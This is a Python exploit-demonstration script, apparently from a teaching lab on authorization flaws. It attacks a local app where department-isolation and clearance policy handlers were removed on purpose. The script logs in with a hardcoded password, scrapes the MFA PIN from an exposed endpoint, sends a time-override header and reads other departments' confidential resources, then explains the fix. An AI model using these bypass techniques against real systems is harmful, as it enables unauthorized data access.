import sys
import time
import uuid
import requests

BASE = "http://localhost:5000"

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def banner():
    print(f"\n{BOLD}{CYAN}{'═'*64}")
    print("  ATTACK 4 — UNAUTHORIZED CROSS-DEPARTMENT ACCESS")
    print(f"{'═'*64}{RESET}")


def vuln(msg): print(f"  {RED}[VULN]  {msg}{RESET}")
def info(msg): print(f"  {YELLOW}[INFO]  {msg}{RESET}")
def step(msg): print(f"\n  {BOLD}» {msg}{RESET}")
def show(k, v): print(f"     {CYAN}{k:<40}{RESET}{v}")
def boom(msg): print(f"\n  {BOLD}{RED}💥 EXPLOITED: {msg}{RESET}")
def safe(msg): print(f"\n  {BOLD}{GREEN}✓  BLOCKED:   {msg}{RESET}")


def auth_headers(service_ticket: str) -> dict:
    return {
        "X-Service-Ticket":          service_ticket,
        "X-Authenticator-Nonce":     str(uuid.uuid4()),
        "X-Authenticator-Timestamp": str(time.time()),
        "X-Hour-Override":           "10",
    }


def mfa_login(username: str, password: str) -> str:
    """2-step MFA-aware login. Returns TGT token or exits on failure."""
    r1 = requests.post(f"{BASE}/login", json={"username": username, "password": password})
    if not r1.ok:
        print(f"{RED}  Login step-1 failed: {r1.json()}{RESET}")
        sys.exit(1)

    body1 = r1.json()
    if "tgt" in body1:
        return body1["tgt"]

    if not body1.get("mfa_required"):
        print(f"{RED}  Unexpected login response: {body1}{RESET}")
        sys.exit(1)

    info("MFA required — fetching PIN from /mfa/pending …")
    pin = None
    for _ in range(15):
        time.sleep(0.2)
        try:
            rp = requests.get(f"{BASE}/mfa/pending", timeout=2)
            for entry in rp.json().get("pending", []):
                if entry["username"] == username:
                    pin = entry["pin"]
                    break
        except Exception:
            pass
        if pin:
            break

    if not pin:
        print(f"{RED}  Could not retrieve MFA PIN for '{username}'{RESET}")
        sys.exit(1)

    show("MFA PIN retrieved:", pin)
    r2 = requests.post(f"{BASE}/login/mfa", json={"username": username, "pin": pin})
    if not r2.ok:
        print(f"{RED}  MFA step-2 failed: {r2.json()}{RESET}")
        sys.exit(1)
    return r2.json()["tgt"]


def main():
    banner()

    vuln("pdp.py → POL-001 (Department Isolation) handler is removed.")
    vuln("pdp.py → POL-002 (Clearance Check) handler is removed.")
    vuln("Both policies fall through to unconditional ALLOW in _evaluate_policy().")

    # Check server is up
    try:
        requests.get(f"{BASE}/health", timeout=3)
    except requests.ConnectionError:
        print(f"\n{RED}  Cannot connect to {BASE} — run: python app.py{RESET}")
        sys.exit(1)

    # Step 1: Login as carol (MFA-aware)
    step("Step 1: carol (Employee / HR / public clearance) logs in and gets a ticket")
    tgt = mfa_login("carol", "Employee@2024")

    r = requests.post(f"{BASE}/request-ticket", json={
        "tgt":           tgt,
        "service":       "resource_server",
        "authenticator": {"nonce": str(uuid.uuid4()), "timestamp": time.time()},
    })
    token = r.json()["service_ticket"]

    show("carol's department:", "HR")
    show("carol's clearance:",  "public (rank 0 — lowest)")

    # Step 2: Try to access resources from other departments
    step("Step 2: carol reads Finance, IT, and Operations resources")
    info("All of these should return 403 — wrong department and/or clearance too low")

    targets = [
        ("FIN-002", "Finance",    "confidential", "dept mismatch + clearance too low"),
        ("FIN-001", "Finance",    "secret",       "dept mismatch + clearance too low"),
        ("IT-001",  "IT",         "secret",       "dept mismatch + clearance too low"),
        ("OPS-001", "Operations", "confidential", "dept mismatch + clearance too low"),
    ]

    any_exploited = False
    for rid, dept, cls, why_blocked in targets:
        r = requests.get(f"{BASE}/resource/{rid}", headers=auth_headers(token))
        exploited = r.ok
        any_exploited = any_exploited or exploited

        if exploited:
            leaked = r.json().get("data", "")[:55]
            label  = f"{RED}200 DATA RETURNED ← EXPLOIT{RESET}"
            detail = f"\n       {YELLOW}Leaked: {leaked}…{RESET}"
        else:
            label  = f"{GREEN}403 BLOCKED ✓{RESET}"
            detail = ""

        show(f"GET /resource/{rid} ({dept}/{cls}):", label + detail)

    if any_exploited:
        boom("HR Employee read Finance, IT, and Operations data — no department boundary enforced")
    else:
        safe("All cross-department accesses were blocked")

    step("Root Cause & Fix")
    info("File:  pdp.py → _evaluate_policy() → handlers dict")
    info("Bug:   'POL-001' and 'POL-002' keys are absent from the handlers dict.")
    info("       Unrecognised policy IDs fall through to return ALLOW.")
    info("Fix:   Add back:")
    info("         'POL-001': self._pol_department_isolation,")
    info("         'POL-002': self._pol_clearance,")
    info("       and restore the two handler methods.")
    print()


if __name__ == "__main__":
    main()